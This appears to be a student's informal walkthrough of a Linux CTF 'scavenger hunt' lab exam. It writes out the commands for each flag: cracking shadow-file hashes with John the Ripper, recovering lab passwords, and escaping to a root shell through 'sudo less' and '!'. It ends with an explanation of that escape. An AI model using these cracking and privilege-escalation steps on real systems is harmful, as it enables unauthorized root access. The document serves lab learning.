exam:
sudo ./scavenger-hunt-start.sh
sudo apt install docker.io -y  //if docket need to be installed

What do you want to?
1 - Start Apps

ssh student@192.168.200.105 | Goodluck!

flag#1: ls -a {In side Desktop}
find: /home/student/Desktop/.flag_1

flag#2:
$ john --wordlist=/home/student/Desktop/.pass_list.txt  /home/student/Documents/my-files/shadow
$  john --show  /home/student/Documents/my-files/shadow

login as mitnick | trustno1
$ su mitnick 

Flag #3:
find / -name "mitnick*" 2>/dev/null  {we will get /var/log/mitnick.log}

Note:  unzip the fiel 1st fist the zip file "$find / -name "*zip" 2>/dev/null"
$ cat /var/log/mitnick.log
now: Use a compound command to figure out the unique count of IP addresses in this log file. That number is a password.
$ cd /var/log/ | awk '{print $1}' mitnick.log | sort -u | wc -l     {will get ans : 102 which is password}

from the zip file search $  find / -name "*zip" 2>/dev/null
we find several option including '/home/mitnick/Documents/.secret.zip'
$ unzip /home/mitnick/Documents/.secret.zip   {insert the password "102" we just cracked from log file sort}
It will open a file name babbage
babbage will contain "babbage : freedom" credentail
login as babbage : $ su babbage
flag3 will be revilled

flag #4
$ find . -perm 401   {to find list of  user with 401 permission and check on byone users}
babbage:Documents\ $ cat stallman
computer
stallman| computer

login as 'stallman':
$su stallman

flag4 will be found.

 Flag#5

cd ~
cd Documents
ls    {will show flag5.sh}

fix if need flag5.sh and run
it will give flag#5 has and next users password.
{--------------- sysadmin: passw0rd----------------}

flag#6

login as : sysadmin 
sysadmin|passw0rd
then 
cat ~/.bashrc | grep alias
$ flag  {run the alias}flag
we will get flag#6.

Flag #7:

cd ~
$ nano superfile.txt   {then save text "!su" }   {Create a fiell with '!sudo' }
now run with less command>
$sudo less superfile.txt  {then  "shift+1" to get "!" then enter}
now user will get root access. {$whoami // will get ans root}

now do
$sudo less superfile.txt
$shift+!+enter
user will have root permission and flag#7 will be created

Flag#8:
remain login as root user.  {#root}
touch flags.txt
nano flags.txt {copy all flags in the file}
flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.
flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0
flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.
flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0
flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00
flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1
flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

save the file 

FYI : we know student has password list file as hidden and now we have created hashed file. lets do john the ripper.

$ john --format=md5crypt --wordlist=/home/student/Desktop/.pass_list.txt /root/flags.txt
or may be also: john --wordlist=/home/student/Desktop/.pass_list.txt /root/flags.txt
$ john --show flags.txt  


When you run sudo less filename on a file containing the text !su, nothing unusual happens immediately—the file simply opens in the standard less pager, and you will see the text !su printed safely on your screen.
However, a massive security vulnerability opens up if you use the exclamation point (!) while inside the less viewer.


The Hidden Risk: Escape to Root Shell
The less command has a built-in feature that allows users to execute terminal commands directly from the viewer by typing !.
Because you started less with sudo, the less program itself is running with full root administrative privileges.

• The Trigger: If you are viewing the file and press the ! key on your keyboard, less opens a command prompt at the bottom of the screen..
• The Action: If you then type sh (or bash) and hit Enter, you will instantly "escape" the file viewer..
• The Result: You are dropped into a root command shell with absolute control over the entire system, bypassing standard security restrictions. .
